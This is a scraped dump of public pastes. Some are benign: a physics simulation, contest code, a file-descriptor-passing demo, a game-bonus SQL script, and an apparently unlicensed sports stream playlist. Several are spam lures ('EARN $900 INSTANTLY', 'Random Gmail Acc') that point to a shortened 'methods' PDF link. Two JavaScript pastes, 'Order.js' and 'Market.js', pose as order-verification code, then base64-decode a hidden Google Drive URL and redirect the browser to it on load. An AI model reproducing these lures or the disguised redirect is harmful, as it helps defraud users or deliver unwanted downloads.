id,title,username,language,date,content
dhXmRcqC,Binance account CW,zak8203,JavaScript,Monday 31st of March 2025 12:56:31 PM CDT," 
Pdf https://tinyurl.com/methodssss


eOUN0SYFCA
"
rrYCuC4P,e-n collisions(v5) - electrons starts with maxwellian,phystota,C++,Monday 31st of March 2025 12:52:24 PM CDT,"#include <iostream>
#include <random>
#include <fstream>

#include <math.h>
#include <time.h>
#include <iomanip>  // For std::fixed and std::setprecision

#include <algorithm>  // For std::shuffle
#include <numeric>    // For std::iota


#define n_e 100000
#define Emin 0.0
#define Emax 400.0
#define E_mean 100 // mean electron energy, initial distribution
#define bin_width 0.01
#define m_e 9.1E-31 // electron mass in kg
#define k_b 1.38E-23 // Boltzmann constant
#define q 1.602176634E-19 // elementary charge    - eV -> J transfer param
#define N ( (int)((Emax-Emin)/bin_width) ) // add 1 to include E_max if needed?
#define T_n 10.0 // Helium neutral temperature in eV
#define T_e 50.0    // electron Maxwell initial distribution
#define M_n 6.6464731E-31 // Helium atom mass
#define N_He 1000000 // Helium neutrals number
#define Volume 1.0E-12 // Volume to calculate netral density and collision frequency 
#define time 1.0E-3 // 500 microsec time to equalibrate the system

struct Electron {

    //velocity components
    double vx = 0.0;
    double vy = 0.0;
    double vz = 0.0;
    //energy in eV
    double energy = 0.0;
    //Collision flag
    bool collided = false;

    //initialization function // void func(Type0& t) → means the function expects a reference to variable t of type0
    // void initialize(std::mt19937& gen, std::uniform_real_distribution<double>& dis) {
    //     // velocity angles in spherical coordinates
    //     double phi = 2*M_PI*dis(gen);
    //     double cosTheta = 2.0*dis(gen) - 1.0;
    //     double sinTheta = sqrt(1.0 - cosTheta*cosTheta); 
        
    //     energy = E_mean*dis(gen);
        
    //     double speed = sqrt(2*energy*q/m_e);

    //     vx = speed * sinTheta * cos(phi);
    //     vy = speed * sinTheta * sin(phi);
    //     vz = speed * cosTheta;
    // }

    // initializing Maxwell-Boltzmann distribution with T_e
    void initialize(std::mt19937& gen, std::uniform_real_distribution<double>& dis, std::gamma_distribution<double>& maxwell) {

        double R = dis(gen);

        // velocity angles in spherical coordinates
        double phi = 2*M_PI*dis(gen);
        double cosTheta = 2.0*dis(gen) - 1.0;
        double sinTheta = sqrt(1.0 - cosTheta*cosTheta); 

            
        energy = maxwell(gen); // neutrals energies sampled as Maxwell distribution in eV
            
        double speed = sqrt(2*energy*q/m_e);

        //velocity components of neutrals in m/s
        vx = speed * sinTheta * cos(phi);
        vy = speed * sinTheta * sin(phi);
        vz = speed * cosTheta;
    }


};


struct CrossSection {
    double energy;
    double sigma;
};

double interpolate (double energy, const std::vector<CrossSection>& elastic_CS) {


    if (energy < elastic_CS.front().energy) {
        std::cout << "" required energy value lower than range of cross-section data"" << ""\n"";
        return 0.0;
    }
    if (energy > elastic_CS.back().energy) {
        std::cout << "" required energy value higher than range of cross-section data"" << ""\n"";
        return 0.0;        
    }

    int step = 0;   
        while (step < elastic_CS.size() && energy > elastic_CS[step].energy) {
            step++;
        }

    double k = (elastic_CS[step].sigma - elastic_CS[step-1].sigma)/(elastic_CS[step].energy - elastic_CS[step-1].energy);
    double m = elastic_CS[step].sigma - k*elastic_CS[step].energy;
    
    return k*energy + m; 
}


struct NeutralParticle {

    double energy = 0.0;
    double vx = 0.0;
    double vy = 0.0;
    double vz = 0.0;

    void initialize(std::mt19937& gen, std::uniform_real_distribution<double>& dis, std::gamma_distribution<double>& maxwell) {

        double R = dis(gen);

        // velocity angles in spherical coordinates
        double phi = 2*M_PI*dis(gen);
        double cosTheta = 2.0*dis(gen) - 1.0;
        double sinTheta = sqrt(1.0 - cosTheta*cosTheta); 

            
        energy = maxwell(gen); // neutrals energies sampled as Maxwell distribution in eV
            
        double speed = sqrt(2*energy*q/M_n);

        //velocity components of neutrals in m/s
        vx = speed * sinTheta * cos(phi);
        vy = speed * sinTheta * sin(phi);
        vz = speed * cosTheta;
    }
    
};




int main() {

    clock_t start = clock();

    std::vector<Electron> electrons(n_e); // better to use vector instead of simple array as it's dynamically allocated (beneficial for ionization)
//    std::vector<double> neutrals(N_He); // vector for neutrals
    std::vector<NeutralParticle> neutrals(N_He); 


    std::vector<int> histo_random(N, 0); // initialize N size zero-vector for random (initial) histogram
    std::vector<int> histo_maxwell(N, 0); // initialize N size zero-vector for maxwellian histogram
    std::vector<int> histo_neutral(N, 0); // initialize N size zero-vector for neutral distribution histogram

    std::vector<double> elastic(N, 0); // precompiled cross-section energy vector

    std::random_device rd; 
    std::mt19937 gen(rd());
    std::uniform_real_distribution<double> dis(0.0, 1.0);
    std::gamma_distribution<double> maxwell_neutral(1.5, T_n);
    std::gamma_distribution<double> maxwell_electron(1.5, T_e);

    std::uniform_int_distribution<int> pair(0, n_e-1);
    std::uniform_int_distribution<int> neutral_pair(0, N_He-1);    


    std::ifstream elastic_cs(""cross_sections/elastic.dat"");
    if (!elastic_cs.is_open()) {
        std::cerr << ""Error opening file!"" << std::endl;
        return 1;
    }    

    // reading elastic cross section datafile

    std::vector<CrossSection> elastic_CS;

    double energy, sigma;

    while (elastic_cs >> energy >> sigma) {
        elastic_CS.push_back({energy, sigma});
    }    

    elastic_cs.close();


    std::ofstream file0(""velocities.dat"");    
    if (!file0.is_open()) {
        std::cerr << ""Error opening file!"" << std::endl;
        return 1;
    }

    std::ofstream file1(""energies.dat"");    
    if (!file1.is_open()) {
        std::cerr << ""Error opening file!"" << std::endl;
        return 1;
    }
    
    std::ofstream file2(""energies_final.dat"");    
    if (!file2.is_open()) {
        std::cerr << ""Error opening file!"" << std::endl;
        return 1;
    }

    std::ofstream file3(""histo_random.dat"");    
    if (!file3.is_open()) {
        std::cerr << ""Error opening file!"" << std::endl;
        return 1;
    }
    file3 << std::fixed << std::setprecision(10);
    
    std::ofstream file4(""histo_maxwell.dat"");    
    if (!file4.is_open()) {
        std::cerr << ""Error opening file!"" << std::endl;
        return 1;
    }
    file4 << std::fixed << std::setprecision(10);           
    
    std::ofstream file5(""neutral_distribution.dat"");    
    if (!file5.is_open()) {
        std::cerr << ""Error opening file!"" << std::endl;
        return 1;
    }

    std::ofstream file6(""E*f(E).dat"");    
    if (!file6.is_open()) {
        std::cerr << ""Error opening file!"" << std::endl;
        return 1;
    }

    std::ofstream file7(""nu_max.dat"");
    if (!file7.is_open()) {
        std::cerr << ""Error opening file7!"" << std::endl;
        return 1;
    }

    // Initialize all electrons
    for (auto& e : electrons) {
//        e.initialize(gen, dis);
        e.initialize(gen, dis, maxwell_electron);
    }
    // initialize all nenutrals
    for (auto&n : neutrals) {
        n.initialize(gen, dis, maxwell_neutral);
    }
    // precalculate cross-sections for each energy bin
    for (int i = 0; i < N; i++){
        elastic[i] = interpolate(bin_width*(i+0.5), elastic_CS);
    }


    for (int i = 0; i < n_e; i++){
        file1 << i << "" "" << electrons.at(i).energy << ""\n"";
        file0 << i << "" "" << electrons[i].vx << "" "" << electrons[i].vy << "" "" << electrons[i].vz << ""\n""; 
    }


    for (int i = 0; i < n_e; i++){
        int bin = (int)( (electrons[i].energy - Emin)/bin_width );
        if (bin >=0 && bin < histo_random.size())
            histo_random[bin]++;
    }

    for (int i = 0; i < histo_random.size(); i++){
        double bin_start = Emin + i*bin_width;
        file3 << i*bin_width << "" "" <<  (i*bin_width)*static_cast<double>(histo_random[i])/(electrons.size()*bin_width) << ""\n""; // dividing by n_e to get normalized distribution
    }


    for (int i = 0; i < N_He; i++){
        int bin = (int)( (neutrals[i].energy - Emin)/bin_width );
        if (bin >=0 && bin < histo_neutral.size())
            histo_neutral[bin]++;
    }    

    for (int i = 0; i < histo_neutral.size(); i++){
        double bin_start = Emin + i*bin_width;
        file5 << i*bin_width << "" "" << static_cast<double>(histo_neutral[i])/(neutrals.size()*bin_width) << ""\n""; // this is real f(E) - normalized distribution
        file6 << i*bin_width << "" "" << (i*bin_width)*static_cast<double>(histo_neutral[i])/(neutrals.size()*bin_width) << ""\n""; // this should be E*f(E) 

    }   

    double nu_max = 0.0;
    double nu_max_temp = 0.0;

    for (int i = 0; i < N; i++){
        nu_max_temp = (N_He/Volume)*elastic[i] * sqrt(2.0*(i*bin_width + bin_width/2.0)*q/m_e);
        file7 << i << "" "" << nu_max_temp << ""\n"";
        if (nu_max_temp > nu_max)
            nu_max = nu_max_temp;
    }

    std::cout << nu_max << ""\n"";

    double dt = 0.1/nu_max;   // minimum should be 0.1/nu_max to get acceptable numerical error range see Vahedi Surrendra 1995
    double steps = static_cast<int>(time/dt);

//    std::cout << steps << ""\n"";

    //using  null-collision technique, getting the number of particles colliding each step: P_collision = 1 - exp(-nu_max*dt)
    int Ne_collided = (1.0-exp(-1.0*dt*nu_max))*n_e;
//    int Ne_collided = n_e*0.98;  // in case I want to check smth


    // Generate shuffled list of electron indices
    std::vector<int> electron_indices(n_e);
    std::iota(electron_indices.begin(), electron_indices.end(), 0); // fill with index
    std::shuffle(electron_indices.begin(), electron_indices.end(), gen); // shuffle the indexes    
    int reshuffle_interval = 1;
    int print_interval = 100;

    for (int t = 0; t < steps; t++){
        std::cout << ""timestep remains: "" << steps - t << ""\n"";

        //reshuffle the indices
        if (t % reshuffle_interval == 0) {
            std::shuffle(electron_indices.begin(), electron_indices.end(), gen);
        }

        // setting flags to false each timestep
        for (auto& e : electrons) e.collided = false;

        int collision_counter = 0;


        for (int idx : electron_indices) {

            if (collision_counter >= Ne_collided) break; // quit if reached all collisions

            Electron& e = electrons[idx];
            if (e.collided) continue;  // Skip already collided electrons

            double electron_energy = e.energy;
            int bin_energy = static_cast<int>(electron_energy / bin_width);
            double nu_elastic = (N_He/Volume) * elastic[bin_energy] * sqrt(2.0*electron_energy*q/m_e);

            if (dis(gen) < nu_elastic/nu_max) {

                // ----   Collision energy redistribution module

                // electron particle X Y Z initial velocities and energy
                double V0_x_1 = e.vx;
                double V0_y_1 = e.vy;
                double V0_z_1 = e.vz;

                // neutral particle X Y Z initial velocities

                // int k = neutral_pair(gen);

                // double V0_x_2 = neutrals[k].vx;
                // double V0_y_2 = neutrals[k].vy;
                // double V0_z_2 = neutrals[k].vz;

                NeutralParticle tmp_neutral;
                tmp_neutral.initialize(gen, dis, maxwell_neutral);
                double V0_x_2 = tmp_neutral.vx;
                double V0_y_2 = tmp_neutral.vy;
                double V0_z_2 = tmp_neutral.vz;

                // initial relative velocity X Y Z (must be equal to final relative velocity in center-of-mass frame) 

                double V0_rel_x = (V0_x_1 - V0_x_2);
                double V0_rel_y = (V0_y_1 - V0_y_2);
                double V0_rel_z = (V0_z_1 - V0_z_2);

                double V0_rel = sqrt(V0_rel_x*V0_rel_x + V0_rel_y*V0_rel_y + V0_rel_z*V0_rel_z);

                // center-of-mass frame initial velocity (magnitude of it must be equal to the counterpart in this frame)

                double V_cm_x = (m_e*V0_x_1 + M_n*V0_x_2)/(m_e + M_n);
                double V_cm_y = (m_e*V0_y_1 + M_n*V0_y_2)/(m_e + M_n);
                double V_cm_z = (m_e*V0_z_1 + M_n*V0_z_2)/(m_e + M_n);                    

                // generating random variables to calculate random direction of center-of-mass after the collision

                double R1 = dis(gen);
                double R2 = dis(gen);

                // calculating spherical angles for center-of-mass random direction
                double theta = acos(1.0- 2.0*R1);
                double phi = 2*M_PI*R2;

                //calculating final relative velocity with random direction

                double V_rel_x = V0_rel*sin(theta)*cos(phi);
                double V_rel_y = V0_rel*sin(theta)*sin(phi);
                double V_rel_z = V0_rel*cos(theta);

                double V_rel = sqrt(V_rel_x*V_rel_x + V_rel_y*V_rel_y + V_rel_z*V_rel_z);

                //calculating final velocity of electron

                double V_x_1 = V_cm_x + V_rel_x * (M_n/(m_e + M_n));
                double V_y_1 = V_cm_y + V_rel_y * (M_n/(m_e + M_n));
                double V_z_1 = V_cm_z + V_rel_z * (M_n/(m_e + M_n));

                double V_1 = sqrt(V_x_1*V_x_1 + V_y_1*V_y_1 + V_z_1*V_z_1);

                //updating electron energy and velocities
                
                e.energy = m_e*V_1*V_1/(2.0*q);
                e.vx = V_x_1;
                e.vy = V_y_1;
                e.vz = V_z_1;

                collision_counter++;

                e.collided = true;
            }             
        }
                if (t%print_interval == 0){
                // open datafiles to write each time step to see evolution
                std::ostringstream filename;
                filename << ""data/distribution_"" << std::setw(4) << std::setfill('0') << t << "".dat"";

                std::ofstream file(filename.str());
                if (!file.is_open()){
                std::cerr << ""Error opening file: "" << filename.str() << std::endl;
                return 1;
                }
                // end opening datafiles for each timestep
                
                // creating histogram each timestep
                for (int i = 0; i < n_e; i++){
                    int bin = (int)( (electrons[i].energy - Emin)/bin_width );
                    if (bin >=0 && bin < N)
                    histo_maxwell[bin]++;
                }

                // writing data each time step
                for (int i = 0; i < N; i++){
                    double bin_start = Emin + i*bin_width;
                    file << i*bin_width << "" "" <<  static_cast<double>(histo_maxwell[i])/(electrons.size()*bin_width) << ""\n""; // later need to divide by total partcles number to get normalized distribution
                    histo_maxwell[i] = 0;
                }

                file.close();
                // end writing data each timestep
            }

    }


    for (int i = 0; i < n_e; i++){

        file2 << i << "" "" << electrons[i].energy << ""\n"";

        int bin = (int)( (electrons[i].energy - Emin)/bin_width );
        if (bin >=0 && bin < histo_maxwell.size())
            histo_maxwell[bin]++;
    }

    int check = 0;
    for (int i = 0; i < histo_maxwell.size(); i++){
        check += histo_maxwell[i];
        double bin_start = Emin + i*bin_width;
        file4 << i*bin_width << "" "" <<  (i*bin_width)*static_cast<double>(histo_maxwell[i])/(electrons.size()*bin_width) << ""\n""; // getting f(E)*E
    }
    std::cout << ""Total # of electrons in histo: "" << check << ""\n"";


    file0.close();
    file1.close();
    file2.close();
    file3.close();
    file4.close();
    file5.close();
    file6.close();
    file7.close();

    clock_t end = clock();

    double elapsed = (double)(end - start) / CLOCKS_PER_SEC;

    std::cout << ""Ne collided each timesteps:"" << Ne_collided << ""\n"";
    std::cout << ""Energies written successfuly\n"";
    std::cout << ""Elapsed time: %f seconds "" << elapsed << ""\n"";


    return 0;

}"
TRSgHr3f,投入严厉地本地 参考代码,Dmaxiya,C++,Monday 31st of March 2025 12:42:30 PM CDT,"#include <bits/stdc++.h>
using namespace std;

typedef long long LL;
const int maxn = 100 + 100;
int T, k;
string s, t;
string ss[maxn];
map<string, char> ans;

bool judgeAns() {
    string tt = s.substr(0, k);
    for (int i = k; i < s.length(); ++i) {
        map<string, char>::iterator it = ans.find(ss[i]);
        if (it == ans.end()) {
            tt.push_back(s[i]);
            continue;
        }
        if (it->second == 0) {
            continue;
        }
        tt.push_back(it->second);
    }
    return tt == t;
}

void outputAns() {
    cout << ans.size() << endl;
    for (map<string, char>::iterator it = ans.begin(); it != ans.end(); ++it) {
        cout << ""("" << it->first << "","";
        if (it->second != 0) {
            cout << it->second;
        }
        cout << "")"" << endl;
    }
}

bool dfs(int depthS, int depthT) {
    if (depthS == s.length()) {
        if (depthT == t.length() && judgeAns()) {
            outputAns();
            return true;
        }
        return false;
    }

    map<string, char>::iterator it = ans.find(ss[depthS]);
    if (it == ans.end()) {
        ans[ss[depthS]] = 0;
        if (dfs(depthS + 1, depthT)) {
            return true;
        }
        ans[ss[depthS]] = t[depthT];
        if (dfs(depthS + 1, depthT + 1)) {
            return true;
        }
        ans.erase(ss[depthS]);
        return false;
    }

    if (it->second == 0) {
        return dfs(depthS + 1, depthT);
    }
    if (it->second != t[depthT]) {
        return false;
    }
    return dfs(depthS + 1, depthT + 1);
}

int main() {
#ifdef ExRoc
    freopen(""test.txt"", ""r"", stdin);
#endif // ExRoc
    ios::sync_with_stdio(false);

    cin >> T;
    while (T--) {
        ans.clear();
        cin >> s >> t >> k;
        s = "" "" + s;
        t = "" "" + t;
        for (int i = k; i < s.length(); ++i) {
            ss[i] = s.substr(i - k + 1, k);
        }
        dfs(k, k);
    }

    return 0;
}
"
9hiha1fu,EARN $900 INSTANTLY 2025 BT,zak8203,JavaScript,Monday 31st of March 2025 12:40:35 PM CDT," 
Pdf https://tinyurl.com/methodssss


ol2VJVaPxh
"
WTHi9DLD,Untitled,Locative,SQL,Monday 31st of March 2025 12:37:23 PM CDT,"-- [ Оплата за: март]
 
--------- [ Отработанное время: ]
 
Locative: 2 (FUN) 174 (x100) -- 176
Зилиус:  0 (x100) -- 0
Khyntia: 68 (FUN), 0 (x100) -- 68
jegerm  - EN GM: 170 (FUN), 6 (x100) -- 176
Mairena: 0 (FUN) 104 (x100) -- 104
Lorad: 0 (x100) -- 0


--------- [ Бонусы: ]

UPDATE `bonus` SET `gold`=gold+4000 WHERE `id`='1407530'; -- Locative(3000ГМ + 1000РГМ)
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (1407530, NOW(), 4000, '+4000 золотых бонусов - з/п Ргм Locative за март');

UPDATE `bonus` SET `gold`=gold+0 WHERE `id`='229884'; -- Зилиус (ГМ)
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (229884, NOW(), 0, '+0 золотых бонусов - з/п ГМ Зилиус за март');

UPDATE `bonus` SET `gold`=gold+1500 WHERE `id`='949105'; -- Khyntia (ГМ).
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (949105, NOW(), 1500, '+1500 золотых бонусов - з/п ГМ Khyntia за март'); 

UPDATE `bonus` SET `gold`=gold+3500 WHERE `id`='455260'; -- Jegerm (EN GM) + md FB.
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (455260, NOW(), 3500, '+3500 золотых бонусов - з/п ГМ Jegerm за март'); 

UPDATE `bonus` SET `gold`=gold+3000 WHERE `id`='1407530'; -- Mairena
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (1407530, NOW(), 3000, '+3000 золотых бонусов - з/п ГМ Mairena за март'); 


-- Техническая поддержка

UPDATE `bonus` SET `gold`=gold+1000 WHERE `id`='456853'; -- Seanone
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (456853, NOW(), 1000, '+1000 золотых бонусов - з/п тех.поддержки Seanone за март'); 


-- QA Team

UPDATE `bonus` SET `gold`=gold+1000 WHERE `id`='211220'; -- nastyasia
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (211220, NOW(), 1000, '+1000 золотых бонусов - з/п QA-тестер nastyasia за март'); 

"
KWCHJRps,clone test,Anistorm,JSON,Monday 31st of March 2025 12:32:57 PM CDT,"{
    ""name"": ""🎈 Llista Ani 😎"",
    ""author"": ""Última actualització: 23/02/2025"",
    ""image"": ""https://i.gyazo.com/7d12c8f8374e9c1417051387b90fdfc4.jpg"",
    ""url"":""https://pastebin.com/raw/KWCHJRps"",
	""info"": ""Última actualització: 23/02/2025"",
    ""groups"":[
{""name"": ""LA LIGA"",
            ""image"": ""https://upload.wikimedia.org/wikipedia/commons/thumb/0/0f/LaLiga_logo_2023.svg/241px-LaLiga_logo_2023.svg.png"",
            ""stations"": [
{
                    ""name"": ""LA LIGA [MULTIAUDIO]"",
                    ""image"": ""https://i.imgur.com/3SlR9A2.png"",
                    ""url"": ""acestream://d3de78aebe544611a2347f54d5796bd87f16c92d"",
                    ""isHost"": true
                },
                {
                    ""name"": ""LA LIGA [MULTIAUDIO] (#2)"",
                    ""image"": ""https://i.imgur.com/3SlR9A2.png"",
                    ""url"": ""acestream://6d05b31e5e8fdae312fbd57897363a7b10ddb163"",
                    ""isHost"": true
                },
{
                    ""name"": ""LA LIGA [1080]"",
                    ""image"": ""https://i.imgur.com/3SlR9A2.png"",
                    ""url"": ""acestream://94d34491106e00394835c8cb68aa94481339b53f"",
                    ""isHost"": true
                },
{
                    ""name"": ""LA LIGA [1080] (#2)"",
                    ""image"": ""https://i.imgur.com/3SlR9A2.png"",
                    ""url"": ""acestream://cc9b7f5fe416069a2110da0909b0f915043c468b"",
                    ""isHost"": true
                },
                {
                    ""name"": ""LA LIGA [720]"",
                    ""image"": ""https://i.imgur.com/3SlR9A2.png"",
                    ""url"": ""acestream://1bc437bce57b4b0450f6d1f8d818b7e97000745e"",
                    ""isHost"": true
                },
{
                    ""name"": ""LA LIGA [NEW LOOP]"",
                    ""image"": ""https://i.imgur.com/3SlR9A2.png"",
                    ""url"": ""acestream://cc9b7f5fe416069a2110da0909b0f915043c468b"",
                    ""isHost"": true
                },
                {
                    ""name"": ""LA LIGA 2 [1080]"",
                    ""image"": ""https://i.imgur.com/cyesAMN.png"",
                    ""url"": ""acestream://83c6c4942d69f4aa324aa746c5d7dbfd7d1572b3"",
                    ""isHost"": true
                },
{
                    ""name"": ""LA LIGA 2 [720]"",
                    ""image"": ""https://i.imgur.com/cyesAMN.png"",
                    ""url"": ""acestream://f31a586422c9244196c810c84b6c85da350318a5"",
                    ""isHost"": true
                },
                {
                    ""name"": ""DAZN LA LIGA [MULTIAUDIO]"",
                    ""image"": ""https://i.imgur.com/kbMztFO.png"",
                    ""url"": ""acestream://110d441ddc9713a7452588770d2bc85504672f47"",
                    ""isHost"": true
                },
{
                    ""name"": ""DAZN LA LIGA [MULTIAUDIO] (#2)"",
                    ""image"": ""https://i.imgur.com/kbMztFO.png"",
                    ""url"": ""acestream://ec29289b0b14756e686c03a501bae1efa05be70c"",
                    ""isHost"": true
                },
{
                    ""name"": ""DAZN LA LIGA [MULTIAUDIO] (#3)"",
                    ""image"": ""https://i.imgur.com/kbMztFO.png"",
                    ""url"": ""acestream://6de4794cd02f88f14354b5996823413a59a1de0f"",
                    ""isHost"": true
                },
{
                    ""name"": ""DAZN LA LIGA [720]"",
                    ""image"": ""https://i.imgur.com/kbMztFO.png"",
                    ""url"": ""acestream://8c8c1e047a1c5ed213ba74722a5345dc55c3c0eb"",
                    ""isHost"": true
                },
{
                    ""name"": ""DAZN LA LIGA [FHD]"",
                    ""image"": ""https://i.imgur.com/kbMztFO.png"",
                    ""url"": ""acestream://b5f549da9cafaffab01fb04567ce8a5ad4416b5c"",
                    ""isHost"": true
                },
{
                    ""name"": ""DAZN LA LIGA [FHD] (#2)"",
                    ""image"": ""https://i.imgur.com/kbMztFO.png"",
                    ""url"": ""acestream://a5144874f66a0872fd0b5a484cd426eb7d8eaa26"",
                    ""isHost"": true
                },
{
                    ""name"": ""DAZN LA LIGA 2 [MULTIAUDIO]"",
                    ""image"": ""https://i.imgur.com/PgMDnz4.png"",
                    ""url"": ""acestream://97ba38d47680954be40e48bd8f43e17222fefecb"",
                    ""isHost"": true
                },
{
                    ""name"": ""DAZN LA LIGA 2 [720]"",
                    ""image"": ""https://i.imgur.com/PgMDnz4.png"",
                    ""url"": ""acestream://51dbbfb42f8091e4ea7a2186b566a40e780953d9"",
                    ""isHost"": true
                },
{
                    ""name"": ""DAZN LA LIGA 2 [NEW ERA]"",
                    ""image"": ""https://i.imgur.com/PgMDnz4.png"",
                    ""url"": ""acestream://fb51ef5294e99767811a3fa95a1933fb864e9ff3"",
                    ""isHost"": true
                },
{
                    ""name"": ""LALIGA TV BAR [1080]"",
                    ""image"": ""https://www.thesportsdb.com/images/media/channel/logo/f9y6oe1692444384.png"",
                    ""url"": ""acestream://608b0faf7d3d25f6fe5dba13d5e4b4142949990e"",
                    ""isHost"": true
                },
{
                    ""name"": ""LALIGA TV BAR [1080] (#2)"",
                    ""image"": ""https://www.thesportsdb.com/images/media/channel/logo/f9y6oe1692444384.png"",
                    ""url"": ""acestream://94d34491106e00394835c8cb68aa94481339b53f"",
                    ""isHost"": true
                },
{
                    ""name"": ""LALIGA TV BAR [NEW ERA II]"",
                    ""image"": ""https://www.thesportsdb.com/images/media/channel/logo/f9y6oe1692444384.png"",
                    ""url"": ""acestream://580fa1e7623d514a94e8585f90c42eda09d5e4f1"",
                    ""isHost"": true
                },
]
},
]
},"
nLgKziL7,Random Gmail Acc 1A,zak8203,JavaScript,Monday 31st of March 2025 12:24:41 PM CDT," 
Pdf https://tinyurl.com/methodssss


10YkC0tCd3
"
LpN2vf7v,EARN $900 INSTANTLY 2025 BT,XahmedX209,JavaScript,Monday 31st of March 2025 12:24:03 PM CDT," 
Pdf https://tinyurl.com/methodssss


o1ODc62be2
"
ZKDnHTCq,Random Gmail Acc 1A,XahmedX209,JavaScript,Monday 31st of March 2025 12:08:08 PM CDT," 
Pdf https://tinyurl.com/methodssss


kXHiSMrANF
"
duc7X6We,Order.js,dentira,JavaScript,Monday 31st of March 2025 11:58:01 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/997/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
EUswBcsh,scm_rights,teknoraver,C,Monday 31st of March 2025 11:50:33 AM CDT,"#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/socket.h>
#include <sys/wait.h>

#define pexit(msg) do { perror(msg); exit(1); } while (0)

static int sendfd(int sockfd, int fd)
{
	struct msghdr msg = { 0 };
	struct cmsghdr *cmsg;
	int err;
	char iobuf;
	struct iovec io = {
		.iov_base = &iobuf,
		.iov_len = sizeof(iobuf),
	};
	union {
		char buf[CMSG_SPACE(sizeof(fd))];
		struct cmsghdr align;
	} u;

	msg.msg_iov = &io;
	msg.msg_iovlen = 1;
	msg.msg_control = u.buf;
	msg.msg_controllen = sizeof(u.buf);
	cmsg = CMSG_FIRSTHDR(&msg);
	cmsg->cmsg_level = SOL_SOCKET;
	cmsg->cmsg_type = SCM_RIGHTS;
	cmsg->cmsg_len = CMSG_LEN(sizeof(fd));

	/* Send the file descriptor with an empty message
	 * containing only the ancillary data. */
	msg.msg_iov = NULL;
	msg.msg_iovlen = 0;

	memcpy(CMSG_DATA(cmsg), &fd, sizeof(fd));

	err = sendmsg(sockfd, &msg, 0);
	if (err < 0)
		pexit(""sendmsg"");

	if (err != msg.msg_iovlen) {
		perror(""sendmsg"");
		return -EINVAL;
	}

	return 0;
}

static int recvfd(int sockfd)
{
	struct msghdr msg = { 0 };
	struct cmsghdr *cmsg;
	int err;
	int fd;
	union {
		char buf[CMSG_SPACE(sizeof(fd))];
		struct cmsghdr align;
	} u;

	msg.msg_control = u.buf;
	msg.msg_controllen = sizeof(u.buf);

	err = recvmsg(sockfd, &msg, 0);
	if (err < 0)
		pexit(""recvmsg"");

	cmsg = CMSG_FIRSTHDR(&msg);
	if (!cmsg ||
		cmsg->cmsg_len != CMSG_LEN(sizeof(fd)) ||
		cmsg->cmsg_level != SOL_SOCKET ||
		cmsg->cmsg_type != SCM_RIGHTS)
		pexit(""Invalid cmsg"");

	memcpy(&fd, CMSG_DATA(cmsg), sizeof(fd));

	return fd;
}

int main(void)
{
	int scm_fds[2], r;

	r = socketpair(AF_UNIX, SOCK_STREAM, 0, scm_fds);
	if (r < 0)
		pexit(""socketpair"");
	
	if (fork()) {
		int fd = open(""/"", O_PATH | O_DIRECTORY);

		if (fd < 0)
			pexit(""open"");

		r = sendfd(scm_fds[0], fd);
		if (r < 0)
			pexit(""sendfd"");

		puts(""sent fd"");

	} else {
		int fd = recvfd(scm_fds[1]);

		if (fd < 0)
			pexit(""recvfd"");

		puts(""received fd"");
		
		exit(0);
	}

	wait(NULL);
	puts(""done"");

	return 0;
}
"
QgvAxXdi,Market.js,dentira,JavaScript,Monday 31st of March 2025 11:42:17 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/343/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
tC7M6LLL,config.xml,giannix,HTML,Monday 31st of March 2025 11:41:39 AM CDT,"<!--
  E2m3u2bouquet supplier config file
  Add as many suppliers as required
  this config file will be used and the relevant bouquets set up for all suppliers entered
  0 = No/False
  1 = Yes/True
  For elements with <![CDATA[]] enter value between empty brackets e.g. <![CDATA[mypassword]]>
-->
<config>
  <supplier>
    <name>privo</name><!-- Supplier Name -->
    <enabled>1</enabled><!-- Enable or disable the supplier (0 or 1) -->
